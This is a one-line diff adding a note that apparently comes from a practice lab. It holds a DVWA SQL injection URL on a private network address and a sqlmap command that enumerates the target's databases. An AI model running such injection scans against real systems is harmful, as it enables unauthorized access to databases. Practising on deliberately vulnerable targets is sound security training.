@@ -1,0 +1,1 @@
+http://192.168.31.23/dvwa/vulnerabilites/sqli/?id=1&submi Submit (GET)  # /data/data/com.termux/files/usr/bin/sqlmap -u "http://192.168.31.23/dvwa/vulnerabilites/sqli/?id=1&submi Submit" --dbs
